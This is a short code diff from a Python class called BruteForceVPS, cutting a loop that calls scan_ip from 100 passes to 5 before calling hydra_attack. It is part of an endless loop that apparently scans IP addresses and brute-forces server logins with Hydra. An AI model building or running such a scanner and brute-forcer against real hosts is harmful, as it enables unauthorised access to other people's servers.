@@ -58,7 +58,7 @@ class BruteForceVPS:
         while True:
             if os.path.exists(self.targets_ip_path) == True:
                 os.remove(self.targets_ip_path)
-            for _ in range(100):
+            for _ in range(5):
                 self.scan_ip()
             self.hydra_attack()
 
